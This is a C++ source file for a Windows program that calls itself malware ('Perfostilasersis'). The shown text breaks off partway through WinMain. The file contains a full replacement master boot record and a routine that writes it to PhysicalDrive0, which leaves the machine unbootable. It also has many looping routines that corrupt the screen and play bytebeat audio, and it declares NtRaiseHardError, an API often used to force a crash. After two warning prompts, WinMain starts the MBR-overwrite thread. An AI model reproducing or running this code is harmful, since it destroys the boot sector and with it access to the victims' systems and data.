#include <Windows.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

const unsigned char mbrBytes[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x01, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
0xCD, 0x10, 0xC3, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72,
0x20, 0x77, 0x61, 0x73, 0x20, 0x66, 0x72, 0x69, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x61, 0x66, 0x74,
0x65, 0x72, 0x20, 0x72, 0x75, 0x6E, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x20, 0x64, 0x61, 0x6E,
0x67, 0x65, 0x72, 0x6F, 0x75, 0x73, 0x20, 0x6D, 0x61, 0x6C, 0x77, 0x61, 0x72, 0x65, 0x2E, 0x0D,
0x0A, 0x62, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x77, 0x61, 0x79, 0x2C, 0x20, 0x74, 0x68, 0x65,
0x20, 0x4D, 0x42, 0x52, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x6F, 0x76,
0x65, 0x72, 0x77, 0x72, 0x69, 0x74, 0x74, 0x65, 0x6E, 0x20, 0x58, 0x44, 0x21, 0x0D, 0x0A, 0x20,
0x0D, 0x0A, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x42, 0x79, 0x20, 0x57, 0x69, 0x6C,
0x6C, 0x69, 0x61, 0x6D, 0x50, 0x36, 0x39, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD Overwrite() {
	DWORD dw;
	HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(mbr, mbrBytes, 512, &dw, 0);
	CloseHandle(mbr);
	return 0;
}

DWORD ByteBeat() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>(t & t * 8 | t >> 4 & t >> 8) - 1 & (t >> 9 | t >> 11);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat2() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>(10 * (t * 3 & t % 255) | t >> 3 & t | t >> 7);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat3() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast<char>(5 * (t * t >> 15 | t * t >> 16) | t >> 3 | t >> 4);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat4() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast < char>(19 * (t >> 10 | 15 * t >> 4) & (7 * t >> 12) / 2);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat5() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(20 * t * t * (t >> 11) / 7);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat6() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(t * ((t >> 12 | t >> 8) & 63 & t >> 4));
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat7() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(t * (t & 1024 ? t & 2048 ? t & 4096 ? 8 : 4 : 2 : 1) | t >> 9);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat8() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(t - t * (t >> 14) ^ t >> 6 & t);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat9() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(t << 2 & t * 8 | t << 1 | t >> 3 & t | t >> 7);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat10() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(t ^ t >> 4 ^ (t >> 11 + (t >> 16) % 3) % 16 * t ^ 3 * t);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat11() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>(t * (t & 16384 ? 7 : 5) * (3 + (3 & t >> 14)) >> (3 & t >> 9) | (t | t * 3) >> 5);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD ByteBeat12() {
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0, };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30]; //6 seconds of bytebeat here

	for (DWORD t = 0; t < sizeof(buffer); t++)
		buffer[t] = static_cast <char>((t >> 8 ^ (t >> 8) - 4 ^ 2) % 13 * t);
	WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0, };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(-1);

	return 0;
}

DWORD Shake() {
	HDC desk = GetDC(0);
	int x = SM_CXSCREEN;
	int y = SM_CYSCREEN;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		BitBlt(desk, rand() % 2, rand() % 2, w, h, desk, rand() % 2, rand() % 2, SRCCOPY);
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Colors() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		Sleep(100);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Icons() {
	HDC desk = GetDC(0);
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		desk = GetDC(0);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(desk, x, y, LoadIcon(0, IDI_INFORMATION));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(desk, x, y, LoadIcon(0, IDI_SHIELD));
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD JustAText() {
	HDC desk = GetDC(0);
	int sx = GetSystemMetrics(0);
	int sy = GetSystemMetrics(1);
	LPCWSTR lpText = L"DESTRUCTION";
	while (true)
	{
		desk = GetDC(0);
		SetBkColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(desk, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Colors2Fast() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD CrazyEffect() {
	HDC desk = GetDC(0);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), NOTSRCCOPY);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), SRCINVERT);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), 0x999999);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), SRCAND);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), PATPAINT);
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), PATINVERT);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

void Plg(int counter) {
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0, dY = 0, dW, dH;
	POINT wPt[3];

	hWnd = GetDesktopWindow();
	hWindow = GetWindowDC(hWnd);
	hDsktp = GetDC(0);
	GetWindowRect(hWnd, &wRect);

	dW = GetSystemMetrics(0);
	dH = GetSystemMetrics(1);

	wPt[0].x = wRect.left + counter;
	wPt[0].y = wRect.top - counter;
	wPt[1].x = wRect.right + counter;
	wPt[1].y = wRect.top + counter;
	wPt[2].x = wRect.left - counter;
	wPt[2].y = wRect.bottom - counter;
	PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
}

void Plg2(int counter) {
	HDC hWindow;
	HDC hDsktp;
	HWND hWnd;
	RECT wRect;
	int dX = 0, dY = 0, dW, dH;
	POINT wPt[3];

	hWnd = GetDesktopWindow();
	hWindow = GetWindowDC(hWnd);
	hDsktp = GetDC(0);
	GetWindowRect(hWnd, &wRect);

	dW = GetSystemMetrics(0);
	dH = GetSystemMetrics(1);

	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
}

DWORD PlgA() {
	while (true)
	{
		Plg(10);
		Plg2(10);
		Plg2(10);
		Plg(10);
	}
}

DWORD Rotate() {
	HDC desk = GetDC(0);
	POINT wPt[3];
	RECT wRect;
	while (true)
	{
		desk = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 10;
		wPt[0].y = wRect.top - 10;
		wPt[1].x = wRect.right + 10;
		wPt[1].y = wRect.top + 10;
		wPt[2].x = wRect.left - 10;
		wPt[2].y = wRect.bottom - 10;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Colors3() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		Sleep(10);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD BitBltInsane() {
	HDC desk = GetDC(0);
	int x = SM_CXSCREEN;
	int y = SM_CYSCREEN;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, brush);
		BitBlt(desk, rand() % 2, rand() % 2, w, h, desk, rand() % 2, rand() % 2, PATINVERT);
		BitBlt(desk, rand() % 2, rand() % 2, w, h, desk, rand() % 2, rand() % 2, SRCCOPY);
		BitBlt(desk, rand() % 2, rand() % 2, w, h, desk, rand() % 2, rand() % 2, SRCAND);
		BitBlt(desk, rand() % 2, rand() % 2, w, h, desk, rand() % 2, rand() % 2, NOTSRCERASE);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD TextOut2() {
	HDC desk = GetDC(0);
	int sx = GetSystemMetrics(0);
	int sy = GetSystemMetrics(1);
	LPCWSTR lpText = L"MR BEAST!!";
	while (true)
	{
		desk = GetDC(0);
		SetBkColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(desk, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD ColorHalf() {
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 128, rand() % 128, rand() % 128));
		SelectObject(desk, brush);
		PatBlt(desk, 0, 0, x, y, PATINVERT);
		DeleteObject(brush);
		Sleep(10);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Something() {
	HDC desk = GetDC(0);
	POINT wPt[3];
	RECT wRect;
	while (true)
	{
		desk = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 30;
		wPt[0].y = wRect.top - 20;
		wPt[1].x = wRect.right + 20;
		wPt[1].y = wRect.top + 40;
		wPt[2].x = wRect.left - 30;
		wPt[2].y = wRect.bottom + 10;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		Sleep(10);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Tun() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		SetStretchBltMode(desk, HALFTONE);
		StretchBlt(desk, -5, -5, sw + 9, sh + 9, desk, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(desk, 5, 5, sw - 10, sh - 10, desk, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Delt() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		StretchBlt(desk, -1, -1, sw + 2, sh + 2, desk, 0, 0, sw, sh, SRCINVERT);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD Delty2() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (true)
	{
		desk = GetDC(0);
		StretchBlt(desk, -1, -1, sw + 2, sh + 2, desk, 0, 0, sw, sh, 0x999999);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

DWORD CometRing() {
	HWND upWnd = GetDesktopWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(0);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(0);
		for (int i = 0; i < 1900; i++) {
			BitBlt(desktop, i, i, i, i, desktop, 100, 100, NOTSRCERASE);
			DeleteObject(&i);
		}
		ReleaseDC(upWnd, desktop);
		DeleteDC(desktop); DeleteObject(upWnd); DeleteObject(&xs); DeleteObject(&ys);
	}
}

DWORD TextOut3() {
	HDC desk = GetDC(0);
	int sx = GetSystemMetrics(0);
	int sy = GetSystemMetrics(1);
	LPCWSTR lpText = L"Perfostilasersis!";
	while (true)
	{
		desk = GetDC(0);
		SetBkColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(desk, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		Sleep(4);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	if (MessageBoxW(NULL, L"This program is malware! Are you sure you want to continue?", L"Perfostilasersis", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"It will overwrite the MBR and make your PC unbootable!\r\n\
STILL CONTINUE TO RUN IT?!?!", L"LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			HANDLE OverwriteHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Overwrite, 0, 0, 0);
